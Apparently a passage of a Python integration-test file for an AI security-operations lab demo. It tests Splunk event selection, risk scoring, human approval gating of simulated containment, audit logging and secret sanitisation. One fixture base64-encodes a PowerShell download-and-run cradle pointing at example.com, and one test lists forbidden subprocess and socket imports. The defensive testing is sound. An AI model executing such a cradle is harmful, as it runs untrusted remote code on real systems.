"""Integration tests for the End-to-End Demo Integration Harness.

Verifies:
1. Live-benign mode bounded retrieval, exact fixture ordering and selection, and policy suppression (score 0).
2. Live-benign failure paths: 0 events, missing exact fixture, out-of-order records, malformed timestamps, Splunk errors.
3. Synthetic-critical deterministic path: ToolRouter exercise, high confidence, risk score 80, approval gate.
4. Approval gate paths: approval -> SIMULATED, denial -> NOT_EXECUTED, EOF -> NOT_EXECUTED, retries exhausted -> approval_invalid_input.
5. In-memory audit trail lifecycle events.
6. Optional JSONL persistence and post-workflow persistence failure handling.
7. Safe output boundaries (no raw secrets, environment dumps, or unhandled exceptions).
8. Strict execution boundaries (no subprocess, sockets, or OS command execution in simulator/approval).
"""

import base64
from datetime import datetime, timezone
import io
import json
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, patch

from investigator.ticketing import (
    TicketResult,
    TicketingError,
)

from gateway.splunk_search import (
    SplunkConnectionError,
    SplunkSearchClient,
)
from investigator.approval import (
    ActionAuthorizationContext,
    ApprovalDecision,
    ApprovalRecord,
    DEFAULT_APPROVER,
)
from investigator.audit import AuditEventType
from investigator.audit_writer import AuditWriteError
from investigator.policy import (
    ActionDisposition,
    PolicyDecision,
    ProposedAction,
    RiskLevel,
)
from investigator.simulator import (
    SimulatedResponseExecutor,
    SimulationStatus,
)
from scripts.run_end_to_end_demo import (
    _find_exact_benign_fixture,
    _parse_event_timestamp,
    run_demo,
)


def _encode_ps(cmd: str) -> str:
    """Helper to Base64 encode PowerShell UTF-16LE command."""
    return base64.b64encode(cmd.encode("utf-16le")).decode("ascii")


class TestEndToEndDemoHarness(unittest.TestCase):
    """Integration test suite for run_end_to_end_demo.py."""

    def setUp(self) -> None:
        self.benign_b64 = _encode_ps("Write-Host 'AI-NativeSOC-LAB-TEST'")
        self.suspicious_b64 = _encode_ps("IEX (New-Object Net.WebClient).DownloadString('http://example.com/s')")
        self.benign_splunk_record = {
            "_time": "2026-09-17T12:00:00.000+00:00",
            "host": "DC01",
            "User": "SYSTEM",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": f"powershell.exe -enc {self.benign_b64}",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ParentCommandLine": "cmd.exe /c start",
        }

    # -----------------------------------------------------------------------
    # Live-Benign Tests
    # -----------------------------------------------------------------------

    def test_live_benign_mode_success_offline(self) -> None:
        """Live-benign mode selects exact fixture, achieves score 0, and skips approval prompt."""
        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = [self.benign_splunk_record]

        out_stream = io.StringIO()
        in_stream = io.StringIO()

        code = run_demo(
            mode="live-benign",
            provider="fake",
            minutes=15,
            persist_audit=False,
            stream_in=in_stream,
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("AI-Native SOC Lab -- End-to-End Demo Outcome", output)
        self.assertIn("Risk Score:        0 / 100", output)
        self.assertIn("Risk Level:        LOW", output)
        self.assertIn("Disposition:       NO_ACTION", output)
        self.assertIn("Proposed Action:   no_action", output)
        self.assertIn("Approval Required: no", output)
        self.assertIn("Approval Prompt:   SKIPPED", output)
        self.assertIn("Simulation Status: NOT_EXECUTED", output)
        self.assertIn("Detail Code:       simulation_not_required", output)
        self.assertIn("SIMULATED ONLY -- NO ENDPOINT ACTION PERFORMED", output)

    @patch("investigator.providers.openai_provider.OpenAIModel")
    def test_live_benign_mode_openai_provider_resolution_regression(self, mock_openai_cls: MagicMock) -> None:
        """Regression test: live-benign with --provider openai resolves and constructs OpenAIModel adapter."""
        from scripts.run_end_to_end_demo import _create_live_benign_fake_model
        fake_model = _create_live_benign_fake_model(
            command_line=self.benign_splunk_record["CommandLine"],
            detection_name="suspicious encoded powershell execution",
            decoded_command="Write-Host 'AI-NativeSOC-LAB-TEST'",
            incident_id="INC-REGRESSION-001",
        )
        mock_openai_cls.return_value = fake_model

        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = [self.benign_splunk_record]

        out_stream = io.StringIO()
        code = run_demo(
            mode="live-benign",
            provider="openai",
            minutes=15,
            persist_audit=False,
            stream_in=io.StringIO(),
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 0)
        mock_openai_cls.assert_called_once_with()
        output = out_stream.getvalue()
        self.assertIn("Risk Score:        0 / 100", output)
        self.assertIn("Risk Level:        LOW", output)
        self.assertIn("Disposition:       NO_ACTION", output)

    def test_live_benign_mode_multiple_events_out_of_order_selects_newest_exact_fixture(self) -> None:
        """Results returned out of order are sorted by timestamp and the newest exact fixture is chosen."""
        older_benign = dict(self.benign_splunk_record)
        older_benign["_time"] = "2026-09-17T10:00:00.000+00:00"

        newest_suspicious = dict(self.benign_splunk_record)
        newest_suspicious["_time"] = "2026-09-17T12:30:00.000+00:00"
        newest_suspicious["CommandLine"] = f"powershell.exe -enc {self.suspicious_b64}"

        middle_benign = dict(self.benign_splunk_record)
        middle_benign["_time"] = "2026-09-17T11:15:00.000+00:00"

        # Return in scrambled chronological order
        records = [older_benign, newest_suspicious, middle_benign]
        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = records

        out_stream = io.StringIO()
        code = run_demo(
            mode="live-benign",
            provider="fake",
            minutes=15,
            persist_audit=False,
            stream_in=io.StringIO(),
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        # Incident ID should reflect the middle benign timestamp (2026-09-17T11:15:00), not the older one
        self.assertIn("2026-09-17T11:15:00.000+00:00", output)
        self.assertIn("Risk Score:        0 / 100", output)

    def test_live_benign_mode_no_exact_fixture_fails_closed(self) -> None:
        """If returned events do not contain the exact benign fixture string, fail closed."""
        suspicious_record = dict(self.benign_splunk_record)
        suspicious_record["CommandLine"] = f"powershell.exe -enc {self.suspicious_b64}"

        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = [suspicious_record]

        out_stream = io.StringIO()
        code = run_demo(
            mode="live-benign",
            provider="fake",
            minutes=15,
            persist_audit=False,
            stream_in=io.StringIO(),
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 1)
        output = out_stream.getvalue()
        self.assertIn("Controlled benign lab fixture not found in the bounded Splunk window", output)
        self.assertNotIn("Risk Score:", output)

    def test_live_benign_mode_malformed_timestamp_skipped_safely(self) -> None:
        """A candidate with an unparseable timestamp is safely ignored and never chosen as benign evidence."""
        bad_time_record = dict(self.benign_splunk_record)
        bad_time_record["_time"] = "not-a-valid-timestamp"

        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = [bad_time_record]

        out_stream = io.StringIO()
        code = run_demo(
            mode="live-benign",
            provider="fake",
            minutes=15,
            persist_audit=False,
            stream_in=io.StringIO(),
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 1)
        self.assertIn("Controlled benign lab fixture not found", out_stream.getvalue())

    def test_live_benign_mode_zero_events_fails_closed(self) -> None:
        """When Splunk returns zero events, halts fail-closed with clear operator instructions."""
        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = []

        out_stream = io.StringIO()
        code = run_demo(
            mode="live-benign",
            provider="fake",
            minutes=15,
            persist_audit=False,
            stream_in=io.StringIO(),
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 1)
        self.assertIn("Controlled benign lab fixture not found in the bounded Splunk window", out_stream.getvalue())

    def test_live_benign_mode_splunk_connection_error_fails_closed(self) -> None:
        """Connection failure to localhost:8089 fails closed and provides environment troubleshooting advice."""
        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.side_effect = SplunkConnectionError("Connection refused")

        out_stream = io.StringIO()
        code = run_demo(
            mode="live-benign",
            provider="fake",
            minutes=15,
            persist_audit=False,
            stream_in=io.StringIO(),
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 1)
        output = out_stream.getvalue()
        self.assertIn("Splunk connection error: Connection refused", output)
        self.assertIn("live-benign requires running locally on Splunk-Server", output)

    def test_parse_event_timestamp_formats(self) -> None:
        """Verify _parse_event_timestamp handles real Splunk UTC and ISO formats while rejecting malformed inputs."""
        # 1. Real Splunk format observed live: "2026-09-17 14:51:09.779 UTC"
        dt_splunk = _parse_event_timestamp("2026-09-17 14:51:09.779 UTC")
        self.assertIsNotNone(dt_splunk)
        self.assertEqual(dt_splunk, datetime(2026, 9, 17, 14, 51, 9, 779000, tzinfo=timezone.utc))

        # 2. ISO format with trailing "Z"
        dt_z = _parse_event_timestamp("2026-09-17T14:51:09.779Z")
        self.assertIsNotNone(dt_z)
        self.assertEqual(dt_z, datetime(2026, 9, 17, 14, 51, 9, 779000, tzinfo=timezone.utc))

        # 3. Standard ISO format with "+00:00" offset
        dt_iso = _parse_event_timestamp("2026-09-17T14:51:09.779+00:00")
        self.assertIsNotNone(dt_iso)
        self.assertEqual(dt_iso, datetime(2026, 9, 17, 14, 51, 9, 779000, tzinfo=timezone.utc))

        # 4. Malformed timezone strings remain rejected (return None)
        self.assertIsNone(_parse_event_timestamp("2026-09-17 14:51:09.779 EST"))
        self.assertIsNone(_parse_event_timestamp("2026-09-17 14:51:09.779 GMT"))
        self.assertIsNone(_parse_event_timestamp("2026-09-17 14:51:09.779 +0500"))
        self.assertIsNone(_parse_event_timestamp("not-a-timestamp"))
        self.assertIsNone(_parse_event_timestamp(""))

    def test_live_benign_mode_real_splunk_utc_timestamp_format(self) -> None:
        """Live-benign fixture selection succeeds with real Splunk '... UTC' timestamp format."""
        splunk_record_utc = dict(self.benign_splunk_record)
        splunk_record_utc["_time"] = "2026-09-17 14:51:09.779 UTC"

        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = [splunk_record_utc]

        out_stream = io.StringIO()
        code = run_demo(
            mode="live-benign",
            provider="fake",
            minutes=15,
            persist_audit=False,
            stream_in=io.StringIO(),
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("AI-Native SOC Lab -- End-to-End Demo Outcome", output)
        self.assertIn("Risk Score:        0 / 100", output)
        self.assertIn("Risk Level:        LOW", output)
        self.assertIn("Disposition:       NO_ACTION", output)
        self.assertIn("Write-Host 'AI-NativeSOC-LAB-TEST'", output)

    # -----------------------------------------------------------------------
    # Synthetic-Critical Tests
    # -----------------------------------------------------------------------

    def test_synthetic_critical_mode_approval_simulated(self) -> None:
        """Synthetic critical mode reaches score 80, requests approval, and on 'approve' produces SIMULATED."""
        in_stream = io.StringIO("approve\n")
        out_stream = io.StringIO()

        code = run_demo(
            mode="synthetic-critical",
            provider=None,
            persist_audit=False,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("Risk Score:        80 / 100", output)
        self.assertIn("Risk Level:        CRITICAL", output)
        self.assertIn("Disposition:       APPROVAL_REQUIRED", output)
        self.assertIn("Proposed Action:   simulate_endpoint_isolation", output)
        self.assertIn("Approval Required: yes", output)
        self.assertIn("Approval Decision: APPROVED (approval_granted)", output)
        self.assertIn("Simulation Status: SIMULATED", output)
        self.assertIn("Detail Code:       simulated_endpoint_isolation", output)
        self.assertIn("SIMULATED CONTAINMENT RECORDED", output)
        self.assertIn("SIMULATED ONLY -- NO ENDPOINT ACTION PERFORMED", output)

        # Verify ToolRouter exercise and audit lifecycle
        self.assertIn("TOOL_REQUESTED", output)
        self.assertIn("TOOL_ALLOWED", output)
        self.assertIn("TOOL_COMPLETED", output)
        self.assertIn("FINAL_RESULT_ACCEPTED", output)
        self.assertIn("POLICY_EVALUATED", output)
        self.assertIn("APPROVAL_REQUIRED", output)
        self.assertIn("APPROVAL_REQUESTED", output)
        self.assertIn("APPROVAL_GRANTED", output)
        self.assertIn("SIMULATION_COMPLETED", output)

    def test_synthetic_critical_mode_denial_not_executed(self) -> None:
        """Synthetic critical mode on explicit operator 'deny' produces NOT_EXECUTED."""
        in_stream = io.StringIO("deny\n")
        out_stream = io.StringIO()

        code = run_demo(
            mode="synthetic-critical",
            provider=None,
            persist_audit=False,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("Approval Decision: DENIED (approval_denied)", output)
        self.assertIn("Simulation Status: NOT_EXECUTED", output)
        self.assertIn("Detail Code:       simulation_blocked_denied", output)
        self.assertIn("ACTION NOT EXECUTED", output)
        self.assertIn("APPROVAL_DENIED", output)
        self.assertIn("SIMULATION_NOT_EXECUTED", output)

    def test_synthetic_critical_mode_eof_fails_closed(self) -> None:
        """Stream EOF during approval prompts immediately fails closed to DENIED / NOT_EXECUTED."""
        in_stream = io.StringIO("")  # Immediate EOF
        out_stream = io.StringIO()

        code = run_demo(
            mode="synthetic-critical",
            provider=None,
            persist_audit=False,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("Approval Decision: DENIED (approval_denied)", output)
        self.assertIn("Simulation Status: NOT_EXECUTED", output)
        self.assertIn("Detail Code:       simulation_blocked_denied", output)

    def test_synthetic_critical_mode_invalid_input_retries_exhausted(self) -> None:
        """Three invalid CLI attempts fail closed with reason code 'approval_invalid_input'."""
        in_stream = io.StringIO("foo\nbar\nbaz\n")
        out_stream = io.StringIO()

        code = run_demo(
            mode="synthetic-critical",
            provider=None,
            persist_audit=False,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("Approval Decision: DENIED (approval_invalid_input)", output)
        self.assertIn("Simulation Status: NOT_EXECUTED", output)
        self.assertIn("Detail Code:       simulation_blocked_denied", output)

    # -----------------------------------------------------------------------
    # Optional Persistence & Failure Handling Tests
    # -----------------------------------------------------------------------

    def test_optional_jsonl_persistence_success(self) -> None:
        """When --persist-audit is set, audit records are appended to destination file."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            audit_file = Path(tmp_dir) / "test_audit.jsonl"
            in_stream = io.StringIO("approve\n")
            out_stream = io.StringIO()

            code = run_demo(
                mode="synthetic-critical",
                provider=None,
                persist_audit=True,
                stream_in=in_stream,
                stream_out=out_stream,
                audit_log_path=audit_file,
            )

            self.assertEqual(code, 0)
            self.assertTrue(audit_file.exists())
            content = audit_file.read_text(encoding="utf-8").strip().splitlines()
            self.assertGreater(len(content), 5)
            self.assertIn("SIMULATION_COMPLETED", content[-1])

    def test_optional_jsonl_persistence_failure_reports_sanitized_error(self) -> None:
        """When JSONL persistence fails, reports sanitized error without leaking sensitive paths or tokens."""
        sensitive_error = "SECRET_PATH=C:\\sensitive\\audit.jsonl token=abc123"
        with patch("scripts.run_end_to_end_demo.JsonlAuditWriter.write_events", side_effect=AuditWriteError(sensitive_error)):
            in_stream = io.StringIO("approve\n")
            out_stream = io.StringIO()

            code = run_demo(
                mode="synthetic-critical",
                provider=None,
                persist_audit=True,
                stream_in=in_stream,
                stream_out=out_stream,
                audit_log_path=Path("dummy_audit.jsonl"),
            )

            self.assertEqual(code, 1)
            output = out_stream.getvalue()
            self.assertIn("audit_persistence_failed", output)
            self.assertNotIn("SECRET_PATH", output)
            self.assertNotIn("sensitive", output)
            self.assertNotIn("abc123", output)
            self.assertNotIn("rollback", output.lower())

    def test_ticket_failure_audit_persistence_failure_reports_sanitized_error(self) -> None:
        """When audit persistence fails during ticket failure handling, output remains sanitized."""
        sensitive_err = "SECRET_PATH=C:\\sensitive\\audit.jsonl token=abc123"
        with patch("investigator.ticketing.FakeTicketClient.create_ticket", side_effect=Exception("ticket_failed")):
            with patch("scripts.run_end_to_end_demo.JsonlAuditWriter.write_events", side_effect=AuditWriteError(sensitive_err)):
                in_stream = io.StringIO("approve\n")
                out_stream = io.StringIO()

                code = run_demo(
                    mode="synthetic-critical",
                    provider=None,
                    persist_audit=True,
                    create_ticket=True,
                    stream_in=in_stream,
                    stream_out=out_stream,
                    audit_log_path=Path("dummy_audit.jsonl"),
                )

                self.assertEqual(code, 1)
                output = out_stream.getvalue()
                self.assertIn("audit_persistence_failed", output)
                self.assertNotIn("SECRET_PATH", output)
                self.assertNotIn("sensitive", output)
                self.assertNotIn("abc123", output)

    # -----------------------------------------------------------------------
    # Incident Record Artifact Integration Tests (Milestone 5A)
    # -----------------------------------------------------------------------

    def test_demo_write_incident_benign_success(self) -> None:
        """When --write-incident is enabled, benign mode writes valid JSON record with NOT_REQUIRED approval."""
        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = [self.benign_splunk_record]

        with tempfile.TemporaryDirectory() as tmp_dir:
            incidents_path = Path(tmp_dir)
            out_stream = io.StringIO()
            in_stream = io.StringIO()

            code = run_demo(
                mode="live-benign",
                provider="fake",
                minutes=15,
                write_incident=True,
                stream_in=in_stream,
                stream_out=out_stream,
                splunk_client=mock_splunk,
                incidents_dir=incidents_path,
            )

            self.assertEqual(code, 0)
            output = out_stream.getvalue()
            self.assertIn("Incident Record:", output)

            files = list(incidents_path.glob("*.json"))
            self.assertEqual(len(files), 1)

            data = json.loads(files[0].read_text(encoding="utf-8"))
            self.assertEqual(data["schema_version"], "1.0.0")
            self.assertEqual(data["risk_score"], 0)
            self.assertEqual(data["risk_level"], "LOW")
            self.assertEqual(data["disposition"], "NO_ACTION")
            self.assertEqual(data["proposed_action"], "no_action")
            self.assertFalse(data["requires_human_approval"])
            self.assertEqual(data["approval_status"], "NOT_REQUIRED")
            self.assertIsNone(data["approval_reason_code"])
            self.assertEqual(data["simulation_status"], "NOT_EXECUTED")
            self.assertEqual(data["simulation_detail_code"], "simulation_not_required")

    def test_demo_write_incident_synthetic_critical_approved(self) -> None:
        """Synthetic critical mode with operator approval writes APPROVED and SIMULATED incident record."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            incidents_path = Path(tmp_dir)
            out_stream = io.StringIO()
            in_stream = io.StringIO("approve\n")

            code = run_demo(
                mode="synthetic-critical",
                provider=None,
                write_incident=True,
                stream_in=in_stream,
                stream_out=out_stream,
                incidents_dir=incidents_path,
            )

            self.assertEqual(code, 0)
            output = out_stream.getvalue()
            self.assertIn("Incident Record:", output)

            files = list(incidents_path.glob("*.json"))
            self.assertEqual(len(files), 1)

            data = json.loads(files[0].read_text(encoding="utf-8"))
            self.assertEqual(data["incident_id"], "INC-DEMO-CRIT-2026-001")
            self.assertEqual(data["risk_score"], 80)
            self.assertEqual(data["risk_level"], "CRITICAL")
            self.assertEqual(data["disposition"], "APPROVAL_REQUIRED")
            self.assertEqual(data["proposed_action"], "simulate_endpoint_isolation")
            self.assertTrue(data["requires_human_approval"])
            self.assertEqual(data["approval_status"], "APPROVED")
            self.assertEqual(data["approval_reason_code"], "approval_granted")
            self.assertEqual(data["simulation_status"], "SIMULATED")
            self.assertEqual(data["simulation_detail_code"], "simulated_endpoint_isolation")

    def test_demo_write_incident_synthetic_critical_denied(self) -> None:
        """Synthetic critical mode with operator denial writes DENIED and NOT_EXECUTED incident record."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            incidents_path = Path(tmp_dir)
            out_stream = io.StringIO()
            in_stream = io.StringIO("deny\n")

            code = run_demo(
                mode="synthetic-critical",
                provider=None,
                write_incident=True,
                stream_in=in_stream,
                stream_out=out_stream,
                incidents_dir=incidents_path,
            )

            self.assertEqual(code, 0)
            output = out_stream.getvalue()
            self.assertIn("Incident Record:", output)

            files = list(incidents_path.glob("*.json"))
            self.assertEqual(len(files), 1)

            data = json.loads(files[0].read_text(encoding="utf-8"))
            self.assertEqual(data["incident_id"], "INC-DEMO-CRIT-2026-001")
            self.assertEqual(data["risk_score"], 80)
            self.assertEqual(data["risk_level"], "CRITICAL")
            self.assertTrue(data["requires_human_approval"])
            self.assertEqual(data["approval_status"], "DENIED")
            self.assertEqual(data["approval_reason_code"], "approval_denied")
            self.assertEqual(data["simulation_status"], "NOT_EXECUTED")
            self.assertEqual(data["simulation_detail_code"], "simulation_blocked_denied")

    def test_demo_without_write_incident_creates_no_file(self) -> None:
        """When write_incident is False (default), no incident file is written."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            incidents_path = Path(tmp_dir)
            out_stream = io.StringIO()
            in_stream = io.StringIO("deny\n")

            code = run_demo(
                mode="synthetic-critical",
                provider=None,
                write_incident=False,
                stream_in=in_stream,
                stream_out=out_stream,
                incidents_dir=incidents_path,
            )

            self.assertEqual(code, 0)
            output = out_stream.getvalue()
            self.assertNotIn("Incident Record:", output)
            files = list(incidents_path.glob("*.json"))
            self.assertEqual(len(files), 0)

    def test_demo_write_incident_failure_fails_closed(self) -> None:
        """When incident record persistence fails, reports sanitized error and returns exit code 1."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Pointing directory to an existing file causes IncidentPathError
            dummy_file = Path(tmp_dir) / "not_a_dir"
            dummy_file.write_text("blocked", encoding="utf-8")

            out_stream = io.StringIO()
            in_stream = io.StringIO("deny\n")

            code = run_demo(
                mode="synthetic-critical",
                provider=None,
                write_incident=True,
                stream_in=in_stream,
                stream_out=out_stream,
                incidents_dir=dummy_file,
            )

            self.assertEqual(code, 1)
            output = out_stream.getvalue()
            self.assertIn("[!] incident_record_persistence_failed", output)

    # -----------------------------------------------------------------------
    # Downstream Ticketing Integration Tests (Milestone 5B-1)
    # -----------------------------------------------------------------------

    def test_demo_create_ticket_benign_success(self) -> None:
        """When create_ticket is True, benign mode dispatches fake ticket and renders section 6."""
        mock_splunk = MagicMock(spec=SplunkSearchClient)
        mock_splunk.search_encoded_powershell.return_value = [self.benign_splunk_record]

        out_stream = io.StringIO()
        code = run_demo(
            mode="live-benign",
            provider="fake",
            minutes=15,
            create_ticket=True,
            stream_in=io.StringIO(),
            stream_out=out_stream,
            splunk_client=mock_splunk,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("[6. DOWNSTREAM TICKETING (LOCAL FAKE WORKFLOW)]", output)
        self.assertIn("Provider:          fake_ticket_client (offline simulation)", output)
        self.assertIn("Ticket Key:        SEC-0001", output)
        self.assertIn("Detail Code:       ticket_created_fake", output)
        self.assertIn("TICKET_REQUESTED", output)
        self.assertIn("TICKET_CREATED", output)

    def test_demo_create_ticket_synthetic_critical_approved(self) -> None:
        """Synthetic critical mode with operator approval creates fake ticket."""
        out_stream = io.StringIO()
        in_stream = io.StringIO("approve\n")

        code = run_demo(
            mode="synthetic-critical",
            provider=None,
            create_ticket=True,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("[6. DOWNSTREAM TICKETING (LOCAL FAKE WORKFLOW)]", output)
        self.assertIn("Ticket Key:        SEC-0001", output)
        self.assertIn("SIMULATED CONTAINMENT RECORDED", output)
        self.assertIn("TICKET_CREATED", output)

    def test_demo_create_ticket_synthetic_critical_denied(self) -> None:
        """Synthetic critical mode with operator denial creates fake ticket with denied outcome."""
        out_stream = io.StringIO()
        in_stream = io.StringIO("deny\n")

        code = run_demo(
            mode="synthetic-critical",
            provider=None,
            create_ticket=True,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        self.assertEqual(code, 0)
        output = out_stream.getvalue()
        self.assertIn("[6. DOWNSTREAM TICKETING (LOCAL FAKE WORKFLOW)]", output)
        self.assertIn("Ticket Key:        SEC-0001", output)
        self.assertIn("ACTION NOT EXECUTED", output)
        self.assertIn("TICKET_CREATED", output)

    def test_demo_create_ticket_failure_fails_closed(self) -> None:
        """When ticket creation fails, reports sanitized error and returns exit code 1 without leaking exception text."""
        sensitive_error = "SECRET_TOKEN=abc123 raw-provider-body"
        with patch("investigator.ticketing.FakeTicketClient.create_ticket", side_effect=Exception(sensitive_error)):
            out_stream = io.StringIO()
            in_stream = io.StringIO("approve\n")

            code = run_demo(
                mode="synthetic-critical",
                provider=None,
                create_ticket=True,
                stream_in=in_stream,
                stream_out=out_stream,
            )

            self.assertEqual(code, 1)
            output = out_stream.getvalue()
            self.assertIn("ticket_creation_failed", output)
            self.assertNotIn("SECRET_TOKEN", output)
            self.assertNotIn("abc123", output)
            self.assertNotIn("raw-provider-body", output)

    def test_demo_create_ticket_failure_with_persist_audit_records_failure_event(self) -> None:
        """When ticket creation fails with persist_audit enabled, TICKET_REQUESTED and TICKET_FAILED are persisted to JSONL."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            audit_file = Path(tmp_dir) / "test_audit_ticket_failure.jsonl"
            out_stream = io.StringIO()
            in_stream = io.StringIO("approve\n")
            sensitive_error = "SECRET_TOKEN=abc123 raw-provider-body"

            with patch("investigator.ticketing.FakeTicketClient.create_ticket", side_effect=Exception(sensitive_error)):
                code = run_demo(
                    mode="synthetic-critical",
                    provider=None,
                    persist_audit=True,
                    create_ticket=True,
                    stream_in=in_stream,
                    stream_out=out_stream,
                    audit_log_path=audit_file,
                )

            self.assertEqual(code, 1)
            output = out_stream.getvalue()
            self.assertIn("ticket_creation_failed", output)
            self.assertNotIn("SECRET_TOKEN", output)
            self.assertNotIn("abc123", output)
            self.assertNotIn("raw-provider-body", output)

            self.assertTrue(audit_file.exists())
            raw_audit_text = audit_file.read_text(encoding="utf-8")
            self.assertIn("TICKET_REQUESTED", raw_audit_text)
            self.assertIn("TICKET_FAILED", raw_audit_text)
            self.assertNotIn("TICKET_CREATED", raw_audit_text)
            self.assertNotIn("SECRET_TOKEN", raw_audit_text)
            self.assertNotIn("abc123", raw_audit_text)
            self.assertNotIn("raw-provider-body", raw_audit_text)

    def test_demo_create_ticket_with_persist_audit_records_ticket_events(self) -> None:
        """When both persist_audit and create_ticket are set, ticket events are saved to JSONL."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            audit_file = Path(tmp_dir) / "test_audit_ticket.jsonl"
            out_stream = io.StringIO()
            in_stream = io.StringIO("approve\n")

            code = run_demo(
                mode="synthetic-critical",
                provider=None,
                persist_audit=True,
                create_ticket=True,
                stream_in=in_stream,
                stream_out=out_stream,
                audit_log_path=audit_file,
            )

            self.assertEqual(code, 0)
            self.assertTrue(audit_file.exists())
            content = audit_file.read_text(encoding="utf-8").strip().splitlines()
            self.assertIn("TICKET_REQUESTED", content[-2])
            self.assertIn("TICKET_CREATED", content[-1])

    # -----------------------------------------------------------------------
    # Security Boundary & Invariant Tests
    # -----------------------------------------------------------------------

    def test_safe_output_contains_no_secrets_or_raw_payloads(self) -> None:
        """Demo output never leaks environment variables, API keys, or raw JSON payloads."""
        in_stream = io.StringIO("deny\n")
        out_stream = io.StringIO()

        run_demo(
            mode="synthetic-critical",
            provider=None,
            persist_audit=False,
            stream_in=in_stream,
            stream_out=out_stream,
        )

        output = out_stream.getvalue()
        for forbidden in ("sk-", "OPENAI_API_KEY", "<Event xmlns", "\"messages\":"):
            self.assertNotIn(forbidden, output)

    def test_approval_cannot_be_forged_by_model(self) -> None:
        """Simulator rejects attempts to execute without an authoritative ApprovalRecord."""
        decision = PolicyDecision(
            risk_score=80,
            risk_level=RiskLevel.CRITICAL,
            action_disposition=ActionDisposition.APPROVAL_REQUIRED,
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            reasons=("approval_required_for_consequential_action",),
            requires_human_approval=True,
        )
        ctx = ActionAuthorizationContext("INC-TEST-001", decision)
        executor = SimulatedResponseExecutor()

        # Execute with None approval record
        res = executor.execute(ctx, approval_record=None)
        self.assertEqual(res.status, SimulationStatus.NOT_EXECUTED)
        self.assertEqual(res.detail_code, "simulation_blocked_missing_approval")

    def test_simulator_cannot_execute_with_mismatched_context(self) -> None:
        """Simulator rejects an approval record with mismatched incident ID or proposed action."""
        decision = PolicyDecision(
            risk_score=80,
            risk_level=RiskLevel.CRITICAL,
            action_disposition=ActionDisposition.APPROVAL_REQUIRED,
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            reasons=("approval_required_for_consequential_action",),
            requires_human_approval=True,
        )
        ctx = ActionAuthorizationContext("INC-REAL-001", decision)
        mismatched_approval = ApprovalRecord(
            incident_id="INC-FORGED-002",
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            decision=ApprovalDecision.APPROVED,
            approver=DEFAULT_APPROVER,
            reason_code="approval_granted",
        )
        executor = SimulatedResponseExecutor()

        res = executor.execute(ctx, approval_record=mismatched_approval)
        self.assertEqual(res.status, SimulationStatus.NOT_EXECUTED)
        self.assertEqual(res.detail_code, "simulation_blocked_mismatched_approval")

    def test_no_subprocess_or_network_in_simulator_approval(self) -> None:
        """Approval and simulator modules must contain zero subprocess, socket, or OS execution."""
        import investigator.approval as app_mod
        import investigator.simulator as sim_mod

        for mod in (app_mod, sim_mod):
            src = Path(mod.__file__).read_text(encoding="utf-8")
            self.assertNotIn("import subprocess", src)
            self.assertNotIn("from subprocess import", src)
            self.assertNotIn("os.system", src)
            self.assertNotIn("import socket", src)
            self.assertNotIn("import urllib", src)

    def test_demo_create_ticket_jira_success(self) -> None:
        """When ticket_provider is 'jira', dispatches to JiraTicketClient and renders Jira section 6."""
        mock_jira_client = MagicMock()
        mock_jira_client.create_ticket.return_value = TicketResult(
            success=True,
            provider="jira_cloud",
            ticket_key="SEC-8888",
            detail_code="ticket_created_jira",
            created_at_utc="2026-09-22T12:00:00Z",
        )

        in_stream = io.StringIO("approve\n")
        out_stream = io.StringIO()

        code = run_demo(
            mode="synthetic-critical",
            provider=None,
